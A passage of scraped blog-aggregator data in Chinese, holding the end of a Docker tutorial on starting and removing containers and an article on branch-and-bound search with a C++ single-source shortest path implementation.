参数，现在我们可以查看已停止的容器。注意这些容器的状态被标注为 已退出exited。既然容器只是一个进程，那么用“退出”比“停止”更合适！</p>\n<h3 id=\"toc_7\">如何（重新）启动 Docker 容器？</h3>\n<p>现在，我们来启动这个已停止的容器。这和运行一个容器有所区别。当你运行一个容器时，你将启动一个全新的容器。当你启动一个容器时，你将开始一个已经停止并保存了当时运行状态的容器。它将以停止时的状态重新开始运行。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b623fe1635b5446192215\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nroot@kerneltalks #  docker container start c46f2e9e4690\r\nc46f2e9e4690\r\n\r\nroot@kerneltalks # docker container ls -a\r\nCONTAINER ID        IMAGE               COMMAND              CREATED             STATUS              PORTS                NAMES\r\nc46f2e9e4690        httpd               \"httpd-foreground\"   35 minutes ago      Up 8 seconds        0.0.0.0:80-&gt;80/tcp   cranky_cori\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b623fe1635b5446192215-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe1635b5446192215-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b623fe1635b5446192215-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe1635b5446192215-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b623fe1635b5446192215-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe1635b5446192215-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b623fe1635b5446192215-7\">7</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b623fe1635b5446192215-1\"><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">kerneltalks</span><span class=\"crayon-h\"> </span><span class=\"crayon-p\">#  docker container start c46f2e9e4690</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe1635b5446192215-2\"><span class=\"crayon-e\">c46f2e9e4690</span></div><div class=\"crayon-line\" id=\"crayon-5b623fe1635b5446192215-3\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe1635b5446192215-4\"><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">kerneltalks</span><span class=\"crayon-h\"> </span><span class=\"crayon-p\"># docker container ls -a</span></div><div class=\"crayon-line\" id=\"crayon-5b623fe1635b5446192215-5\"><span class=\"crayon-e\">CONTAINER </span><span class=\"crayon-e\">ID        </span><span class=\"crayon-e\">IMAGE               </span><span class=\"crayon-e\">COMMAND              </span><span class=\"crayon-e\">CREATED             </span><span class=\"crayon-e\">STATUS              </span><span class=\"crayon-e\">PORTS                </span><span class=\"crayon-e\">NAMES</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe1635b5446192215-6\"><span class=\"crayon-e\">c46f2e9e4690        </span><span class=\"crayon-i\">httpd</span><span class=\"crayon-h\">               </span><span class=\"crayon-s\">\"httpd-foreground\"</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">35</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">minutes </span><span class=\"crayon-e\">ago      </span><span class=\"crayon-i\">Up</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">8</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">seconds</span><span class=\"crayon-h\">        </span><span class=\"crayon-cn\">0.0.0.0</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">80</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-cn\">80</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">tcp   </span><span class=\"crayon-v\">cranky</span><span class=\"crayon-sy\">_</span>cori</div><div class=\"crayon-line\" id=\"crayon-5b623fe1635b5446192215-7\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0012 seconds] -->\r\n<p></p>\n<h3 id=\"toc_8\">如何移除 Docker 容器？</h3>\n<p>我们使用 <code>rm</code> 命令来移除容器。你不可以移除运行中的容器。移除之前需要先停止容器。你可以使用 <code>-f</code> 参数搭配 <code>rm</code> 命令来强制移除容器，但并不推荐这么做。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b623fe1635b8315484633\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nroot@kerneltalks # docker container rm cranky_cori\r\ncranky_cori\r\nroot@kerneltalks # docker container ls -a\r\nCONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b623fe1635b8315484633-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe1635b8315484633-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b623fe1635b8315484633-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe1635b8315484633-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b623fe1635b8315484633-5\">5</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b623fe1635b8315484633-1\"><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">kerneltalks</span><span class=\"crayon-h\"> </span><span class=\"crayon-p\"># docker container rm cranky_cori</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe1635b8315484633-2\"><span class=\"crayon-e\">cranky_cori</span></div><div class=\"crayon-line\" id=\"crayon-5b623fe1635b8315484633-3\"><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">kerneltalks</span><span class=\"crayon-h\"> </span><span class=\"crayon-p\"># docker container ls -a</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe1635b8315484633-4\"><span class=\"crayon-e\">CONTAINER </span><span class=\"crayon-e\">ID        </span><span class=\"crayon-e\">IMAGE               </span><span class=\"crayon-e\">COMMAND             </span><span class=\"crayon-e\">CREATED             </span><span class=\"crayon-e\">STATUS              </span><span class=\"crayon-e\">PORTS               </span><span class=\"crayon-i\">NAMES</span></div><div class=\"crayon-line\" id=\"crayon-5b623fe1635b8315484633-5\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p>你看，一旦移除了容器，即使再使用 <code>ls -a</code> 命令也查看不到容器了。</p>\n<p> </p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114145\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114145votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114145\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i>  收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_path": "full/e488919f69e980ca011ca1f7af3988436ffd26d1.jpg"},{"url_object_id": "17234c664be7a7620fca5c849015008f", "title": ["分支限界法"], "url": "http://blog.jobbole.com/114061/", "create_date": "2018/06/04", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/06/6093f32a122633db22eb695f0d6cb461.jpg"], "praise_nums": "1", "comment_nums": 0, "fav_nums": 1, "tags": "IT技术, 分支", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"http://www.cnblogs.com/chinazhangjie/archive/2010/11/01/1866136.html\">独酌逸醉</a>   </div><h1>分支限界法与回溯法</h1>\n<p><b></b>（1）求解目标：回溯法的求解目标是找出解空间树中满足约束条件的所有解，而分支限界法的求解目标则是找出满足约束条件的一个解，或是在满足约束条件的解中找出在某种意义下的最优解。 （2）搜索方式的不同：回溯法以深度优先的方式搜索解空间树，而分支限界法则以广度优先或以最小耗费优先的方式搜索解空间树。</p>\n<h2 style=\"font-weight: 400\">分支限界法的基本思想</h2>\n<p>分支限界法常以广度优先或以最小耗费（最大效益）优先的方式搜索问题的解空间树。在分支限界法中，每一个活结点只有一次机会成为扩展结点。活结点一旦成为扩展结点，就一次性产生其所有儿子结点。在这些儿子结点中，导致不可行解或导致非最优解的儿子结点被舍弃，其余儿子结点被加入活结点表中。 此后，从活结点表中取下一结点成为当前扩展结点，并重复上述结点扩展过程。这个过程一直持续到找到所需的解或活结点表为空时为止。</p>\n<h2 style=\"font-weight: 400\">常见的两种分支限界法</h2>\n<p>（1）队列式(FIFO)分支限界法    按照队列先进先出（FIFO）原则选取下一个结点为扩展结点。 （2）优先队列式分支限界法    按照优先队列中规定的优先级选取优先级最高的结点成为当前扩展结点。<b></b></p>\n<h1>一、单源最短路径问题</h1>\n<h2>1、问题描述</h2>\n<p style=\"font-weight: 400\">在下图所给的有向图G中，每一边都有一个非负边权。要求图G的从源顶点s到目标顶点t之间的最短路径。</p>\n<p style=\"font-weight: 400\"><a href=\"http://jbcdn2.b0.upaiyun.com/2018/06/6093f32a122633db22eb695f0d6cb461.jpg\"><img class=\"aligncenter size-full wp-image-114063\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/6093f32a122633db22eb695f0d6cb461.jpg\" alt=\"2010110113034430\"></a></p>\n<p style=\"font-weight: 400\">下图是用优先队列式分支限界法解有向图<span lang=\"EN-US\">G</span>的单源最短路径问题产生的解空间树。其中，每一个结点旁边的数字表示该结点所对应的当前路长。</p>\n<p style=\"font-weight: 400\"><a href=\"http://jbcdn2.b0.upaiyun.com/2018/06/77cfd39c9d0ea8433c2ae9b4e50130df.jpg\"><img class=\"aligncenter size-full wp-image-114064\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/77cfd39c9d0ea8433c2ae9b4e50130df.jpg\" alt=\"2010110113034430\"></a></p>\n<p style=\"font-weight: 400\">找到一条路径：</p>\n<p style=\"font-weight: 400\"><a href=\"http://jbcdn2.b0.upaiyun.com/2018/06/26006811f2b270ce7fbf6bb8d6a7f5cb.jpg\"><img class=\"aligncenter size-full wp-image-114065\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/26006811f2b270ce7fbf6bb8d6a7f5cb.jpg\" alt=\"2010110113034430\"></a></p>\n<p style=\"font-weight: 400\">目前的最短路径是8，一旦发现某个结点的下界不小于这个最短路进，则剪枝：</p>\n<p style=\"font-weight: 400\"><a href=\"http://jbcdn2.b0.upaiyun.com/2018/06/8a10881e817ae003d441b09052dbfc88.jpg\"><img class=\"aligncenter size-full wp-image-114066\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/8a10881e817ae003d441b09052dbfc88.jpg\" alt=\"2010110113034430\"></a></p>\n<p style=\"font-weight: 400\">同一个结点选择最短的到达路径：</p>\n<p style=\"font-weight: 400\"><a href=\"http://jbcdn2.b0.upaiyun.com/2018/06/211efb0a33ee496e04ff356a40d26072.jpg\"><img class=\"aligncenter size-full wp-image-114067\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/211efb0a33ee496e04ff356a40d26072.jpg\" alt=\"2010110113034430\"></a></p>\n<p style=\"font-weight: 400\"><a href=\"http://jbcdn2.b0.upaiyun.com/2018/06/37c8ccc43f73ac92e67232329c02b319.jpg\"><img class=\"aligncenter size-full wp-image-114068\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/37c8ccc43f73ac92e67232329c02b319.jpg\" alt=\"2010110113034430\"></a></p>\n<h2>2.剪枝策略</h2>\n<p>在算法扩展结点的过程中，一旦发现一个结点的下界不小于当前找到的最短路长，则算法剪去以该结点为根的子树。</p>\n<p>在算法中，利用结点间的控制关系进行剪枝。从源顶点s出发，2条不同路径到达图G的同一顶点。由于两条路径的路长不同，因此可以将路长长的路径所对应的树中的结点为根的子树剪去。</p>\n<h2>3.算法思想</h2>\n<p>解单源最短路径问题的优先队列式分支限界法用一极小堆来存储活结点表。其优先级是结点所对应的当前路长。</p>\n<p>算法从图G的源顶点s和空优先队列开始。结点s被扩展后，它的儿子结点被依次插入堆中。此后，算法从堆中取出具有最小当前路长的结点作为当前扩展结点，并依次检查与当前扩展结点相邻的所有顶点。如果从当前扩展结点i到顶点j有边可达，且从源出发，途经顶点i再到顶点j的所相应的路径的长度小于当前最优路径长度，则将该顶点作为活结点插入到活结点优先队列中。这个结点的扩展过程一直继续到活结点优先队列为空时为止。</p>\n<h1>实现</h1>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b6230fb5a832870000265\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n2.剪枝策略在算法扩展结点的过程中，一旦发现一个结点的下界不小于当前找到的最短路长，则算法剪去以该结点为根的子树。   在算法中，利用结点间的控制关系进行剪枝。从源顶点s出发，2条不同路径到达图G的同一顶点。由于两条路径的路长不同，因此可以将路长长的路径所对应的树中的结点为根的子树剪去。 3.算法思想解单源最短路径问题的优先队列式分支限界法用一极小堆来存储活结点表。其优先级是结点所对应的当前路长。算法从图G的源顶点s和空优先队列开始。结点s被扩展后，它的儿子结点被依次插入堆中。此后，算法从堆中取出具有最小当前路长的结点作为当前扩展结点，并依次检查与当前扩展结点相邻的所有顶点。如果从当前扩展结点i到顶点j有边可达，且从源出发，途经顶点i再到顶点j的所相应的路径的长度小于当前最优路径长度，则将该顶点作为活结点插入到活结点优先队列中。这个结点的扩展过程一直继续到活结点优先队列为空时为止。实现/* 主题：单源最短路径问题\r\n* 作者：chinazhangjie\r\n* 邮箱：chinajiezhang@gmail.com\r\n* 开发语言：C++\r\n* 开发环境：Mircosoft Virsual Studio 2008\r\n* 时间: 2010.11.01\r\n*/\r\n\r\n#include &lt;iostream&gt;\r\n#include &lt;vector&gt;\r\n#include &lt;queue&gt;\r\n#include &lt;limits&gt;\r\nusing namespace std;\r\n\r\nstruct node_info\r\n{\r\npublic:\r\n    node_info (int i,int w) \r\n        : index (i), weight (w) {}\r\n    node_info () \r\n        : index(0),weight(0) {}\r\n    node_info (const node_info &amp; ni) \r\n        : index (ni.index), weight (ni.weight) {}\r\n\r\n    friend \r\n    bool operator &lt; (const node_info&amp; lth,const node_info&amp; rth) {\r\n        return lth.weight &gt; rth.weight ; // 为了实现从小到大的顺序\r\n    }\r\n\r\npublic:\r\n    int index; // 结点位置\r\n    int weight; // 权值\r\n};\r\n\r\nstruct path_info \r\n{\r\npublic:\r\n    path_info ()\r\n        : front_index(0), weight (numeric_limits&lt;int&gt;::max()) {}\r\n\r\npublic:\r\n    int front_index;\r\n    int weight;\r\n};\r\n\r\n// single source shortest paths\r\nclass ss_shortest_paths\r\n{\r\n     \r\npublic:\r\n    ss_shortest_paths (const vector&lt;vector&lt;int&gt; &gt;&amp; g,int end_location) \r\n        :no_edge (-1), end_node (end_location), node_count (g.size()) , graph (g) \r\n    {}\r\n\r\n    // 打印最短路径\r\n    void print_spaths () const {\r\n        cout &lt;&lt; \"min weight : \" &lt;&lt; shortest_path &lt;&lt; endl;\r\n        cout &lt;&lt; \"path: \" ;\r\n        copy (s_path_index.rbegin(),s_path_index.rend(),\r\n            ostream_iterator&lt;int&gt; (cout, \" \"));\r\n        cout &lt;&lt; endl;\r\n    }\r\n\r\n    // 求最短路径\r\n    void shortest_paths () {\r\n        vector&lt;path_info&gt; path(node_count);\r\n        priority_queue&lt;node_info,vector&lt;node_info&gt; &gt; min_heap;\r\n        min_heap.push (node_info(0,0));    // 将起始结点入队\r\n\r\n        while (true) {\r\n            node_info top = min_heap.top ();    // 取出最大值\r\n            min_heap.pop ();\r\n\r\n            // 已到达目的结点\r\n            if (top.index == end_node) {\r\n                break ;\r\n            }\r\n            // 未到达则遍历\r\n            for (int i = 0; i &lt; node_count; ++ i) {\r\n                // 顶点top.index和i间有边，且此路径长小于原先从原点到i的路径长 \r\n                if (graph[top.index][i] != no_edge &amp;&amp; \r\n                    (top.weight + graph[top.index][i]) &lt; path[i].weight) {\r\n                    min_heap.push (node_info (i,top.weight + graph[top.index][i]));\r\n                    path[i].front_index = top.index;\r\n                    path[i].weight = top.weight + graph[top.index][i];\r\n                }\r\n            }\r\n            if (min_heap.empty()) {\r\n                break ;\r\n            }\r\n        }\r\n\r\n        shortest_path = path[end_node].weight;\r\n        int index = end_node;\r\n        s_path_index.push_back(index) ;\r\n        while (true) {\r\n            index = path[index].front_index ;\r\n            s_path_index.push_back(index);\r\n            if (index == 0) {\r\n                break;\r\n            }\r\n        }\r\n    }\r\n\r\nprivate:\r\n    vector&lt;vector&lt;int&gt; &gt;    graph ;            // 图的数组表示\r\n    int                        node_count;        // 结点个数\r\n    const int                no_edge;        // 无通路\r\n    const int                end_node;        // 目的结点\r\n    vector&lt;int&gt;                s_path_index;    // 最短路径\r\n    int                        shortest_path;    // 最短路径\r\n};\r\n\r\nint main()\r\n{\r\n    const int size = 11; \r\n    vector&lt;vector&lt;int&gt; &gt; graph (size);\r\n    for (int i = 0;i &lt; size; ++ i) {\r\n        graph[i].resize (size);\r\n    }\r\n    for (int i = 0;i &lt; size; ++ i) {\r\n        for (int j = 0;j &lt; size; ++ j) {\r\n            graph[i][j] = -1;\r\n        }\r\n    }\r\n    graph[0][1] = 2;\r\n    graph[0][2] = 3;\r\n    graph[0][3] = 4;\r\n    graph[1][2] = 3;\r\n    graph[1][5] = 2;\r\n    graph[1][4] = 7;\r\n    graph[2][5] = 9;\r\n    graph[2][6] = 2;\r\n    graph[3][6] = 2;\r\n    graph[4][7] = 3;\r\n    graph[4][8] = 3;\r\n    graph[5][6] = 1;\r\n    graph[5][8] = 3;\r\n    graph[6][9] = 1;\r\n    graph[6][8] = 5;\r\n    graph[7][10] = 3;\r\n    graph[8][10] = 2;\r\n    graph[9][8] = 2;\r\n    graph[9][10] = 2;\r\n\r\n    ss_shortest_paths ssp (graph, 10);\r\n    ssp.shortest_paths ();\r\n    ssp.print_spaths ();\r\n    return 0;\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b6230fb5a832870000265-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6230fb5a832870000265-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b6230fb5a832870000265-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6230fb5a832870000265-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b6230fb5a832870000265-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6230fb5a832870000265-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b6230fb5a832870000265-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6230fb5a832870000265-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b6230fb5a832870000265-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6230fb5a832870000265-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b6230fb5a832870000265-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6230fb5a832870000265-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5b6230fb5a832870000265-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6230fb5a832870000265-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5b6230fb5a832870000265-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6230fb5a832870000265-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5b6230fb5a832870000265-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6230fb5a832870000265-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5b6230fb5a832870000265-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6230fb5a832870000265-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5b6230fb5a832870000265-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6230fb5a832870000265-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5b6230fb5a832870000265-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6230fb5a832870000265-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-5b6230fb5a832870000265-25\">25</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6230fb5a832870000265-26\">26</div><div class=\"crayon-num\" data-line=\"crayon-5b6230fb5a832870000265-27\">27</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6230fb5a832870000265-28\">28</div><div class=\"crayon-num\" data-line=\"crayon-5b6230fb5a832870000265-29\">29</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6230fb5a832870000265-30\">30</div><div class=\"crayon-num\" data-line=\"crayon-5b6230fb5a832870000265-31\">31</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6230fb5a832870000265-32\">32</div><div class=\"crayon-num\" data-line=\"crayon-5b6230fb5a832870000265-33\">33</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6230fb5a832870000265-34\">34</div><div class=\"crayon-num\" data-line=\"crayon-5b6230fb5a832870000265-35\">35</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6230fb5a832870000265-36\">36</div><div class=\"crayon-num\" data-line=\"crayon-5b6230fb5a832870000265-37\">37</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6230fb5a832870000265-38\">38</div><div class=\"crayon-num\" data-line=\"crayon-5b6230fb5a832870000265-39\">39</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6230fb5a832870000265-40\">40</div><div class=\"crayon-num\" data-line=\"crayon-5b6230fb5a832870000265-41\">41</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6230fb5a832870000265-42\">42</div><div class=\"crayon-num\" data-line=\"crayon-5b6230fb5a832870000265-43\">43</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6230fb5a832870000265-44\">44</div><div class=\"crayon-num\" data-line=\"crayon-5b6230fb5a832870000265-45\">45</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6230fb5a832870000265-46\">46</div><div class=\"crayon-num\" data-line=\"crayon-5b6230fb5a832870000265-47\">47</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6230fb5a832870000265-48\">48</div><div class=\"crayon-num\" data-line=\"crayon-5b6230fb5a832870000265-49\">49</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6230fb5a832870000265-50\">50</div><div class=\"crayon-num\" data-line=\"crayon-5b6230fb5a832870000265-51\">51</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6230fb5a832870000265-52\">52</div><div 